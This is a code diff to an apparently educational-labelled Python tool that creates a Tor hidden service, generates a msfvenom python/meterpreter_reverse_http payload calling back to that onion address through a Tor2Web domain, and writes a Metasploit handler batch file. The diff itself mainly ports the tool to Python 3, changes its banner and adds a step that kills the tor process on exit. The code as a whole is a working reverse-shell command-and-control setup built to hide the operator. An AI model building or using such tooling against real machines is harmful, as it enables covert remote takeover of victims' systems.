@@ -1,12 +1,13 @@
 # coding=utf-8
 import os
 import shutil
+import signal
 import subprocess
 import time
 
 from stem.control import Controller
-from pyfiglet import Figlet
 from termcolor import colored
+from subprocess import check_output
 
 
 def generatebatch():
@@ -19,11 +20,11 @@ def generatebatch():
         f.write("set LPORT 5000\n")
         f.write("exploit -jz\n")
 
-    print("[+] msfconsole.rc batch file generated in current directory")
-
+    print(" * msfconsole.rc batch file generated in current directory")
+    print('\n')
     # Asking for valid response
     while True:
-        response = raw_input("[!] Start msfconsole now? [yes/no] ")
+        response = input("[!] Start msfconsole now? [yes/no] ")
         if not response.isalpha():
             continue
         if response == 'yes' or response == 'no':
@@ -39,15 +40,17 @@ def generatepayload(hostname):
     # Check if msfvenom is installed
     rc = subprocess.call(['which', 'msfvenom'], stdout=subprocess.PIPE)
     if rc:
+        print('\n')
         print('[!] Unable to find msfvenom! Exiting..')
         exit(0)
     print(" * Generating msfvenom python/meterpreter_reverse_http payload..")
+    print('\n')
     # Append .ws Tor2Web extension
     lhost = hostname + ".ws"
     # Generate payload
     payload = "msfvenom -p python/meterpreter_reverse_http LHOST=" + lhost + " LPORT=80 > payload.py"
     subprocess.call(payload, stdout=subprocess.PIPE, shell=True)
-    print("[+] payload.py generated in current directory")
+    print(" * payload.py generated in current directory")
 
 
 def stem():
@@ -56,6 +59,7 @@ def stem():
     # Check if tor is installed
     rc = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
     if rc:
+        print('\n')
         print('[!] Unable to find tor! Exiting..')
         exit(0)
     else:
@@ -88,6 +92,7 @@ def stem():
             generatepayload(result.hostname)
             # Generate metasploit batch file
             generatebatch()
+            print('\n')
         else:
             print(
                 "* Unable to determine our service's hostname, probably due to being unable to read the hidden "
@@ -95,7 +100,7 @@ def stem():
             exit(0)
 
         try:
-            raw_input(" * RUNNING - hit enter, or ^C to quit")
+            input("\x1b[6;30;42mRUNNING - <enter> to quit\x1b[0m")
         finally:
             # Shut down the hidden service and clean it off disk. Note that you *don't*
             # want to delete the hidden service directory if you'd like to have this
@@ -103,45 +108,32 @@ def stem():
             print(" * Shutting down hidden service and clean it off disk")
             controller.remove_hidden_service(hidden_service_dir)
             shutil.rmtree(hidden_service_dir)
+            print(" * Shutting down tor")
+            os.kill(int(check_output(["pidof", "tor"])), signal.SIGTERM)
 
 
 def main():
     """Main function of tool"""
 
-    print("""
-                                        ░░░░░░░░░░                    
-                                      ░░░░░░░░                        
-                                    ░░░░░░░░░░                       
-                                  ░░░░░░░░░░░░░░                 
-                                ░░░░░░░░░░░░░░░░░░                      
-                              ░░░░░░░░░░░░░░░░░░░░░░           
-                ▒▒          ░░░░░░██░░░░██░░░░░░░░░░░░                  
-                ▒▒          ░░░░██▓▓░░░░▓▓██░░░░░░░░░░░░       
-                ▒▒        ░░░░██▓▓░░░░░░░░▓▓██░░░░░░░░░░              
-                ▒▒        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░              
-                  ▒▒      ░░░░░░▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░              
-                    ▒▒    ░░░░░░▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░              
-                      ▒▒▒▒░░░░░░▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░▒▒▒▒▒▒        
-                            ░░░░▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░        ▒▒      
-                                ▒▒▒▒▒▒▒▒▒▒░░░░░░                ▒▒    
-                                      ░░░░░░░░                    ▒▒  
-                        ▒▒▒▒▒▒▒▒▒▒              ▒▒                  ▒▒
-                      ▒▒                          ▒▒                ▒▒
-                    ▒▒                              ▒▒              ▒▒
-                  ▒▒                                  ▒▒              
-                  ▒▒                                    ▒▒            
-                  ▒▒                                      ▒▒          
-                  ▒▒                                        ▒▒        
-                                                              ▒▒      
-    """)
+    print("""\033[91m
 
-    #print(colored("calfcrusher@inventati.org | For educational use only", 'green'))
-    #print('\n')
-    time.sleep(5)
+
+            ██████╗░░█████╗░██╗░█████╗░███╗░░██╗░█████╗░
+            ██╔══██╗██╔══██╗██║██╔══██╗████╗░██║██╔══██╗
+            ██████╔╝██║░░██║██║███████║██╔██╗██║███████║
+            ██╔═══╝░██║░░██║██║██╔══██║██║╚████║██╔══██║
+            ██║░░░░░╚█████╔╝██║██║░░██║██║░╚███║██║░░██║
+            ╚═╝░░░░░░╚════╝░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
+    \x1b[0m""")
+
+    print(colored("\tMeterpreter Reverse shell on TOR using hidden services", 'red'))
+    print(colored("\tcalfcrusher@inventati.org | For educational use only", 'red'))
+    print('\n')
+
+    time.sleep(2)
     stem()
 
 
 if __name__ == "__main__":
     os.system('clear')
     main()
-    print("Bye!")
